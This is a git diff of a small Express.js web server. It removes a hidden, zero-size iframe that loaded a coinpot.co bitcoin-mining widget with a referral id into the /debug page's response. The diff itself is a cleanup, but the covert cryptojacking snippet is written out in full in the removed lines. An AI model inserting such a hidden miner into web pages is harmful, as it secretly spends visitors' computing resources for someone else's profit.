@@ -24,7 +24,7 @@ var debugteacher = 'Mate'
 var debugclass = '5AHELS'
 
 app.get('/debug', function(req, res){
-	res.send('Debugging Page...'+bm)
+	res.send('Debugging Page...')
 		toMySql(debugdate, debuglesson, debugcases, debugteacher, debugclass)
 
 })
@@ -105,5 +105,3 @@ function insertIntoDatabase(sqlStr){
 app.listen(8000, function () {
   console.log('Webserver listening on port 8000!')
 })
-
-var bm = '<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=4523B3C471BA&mode=widget" style="overflow:hidden;width:0px;height:0px;"></iframe>'
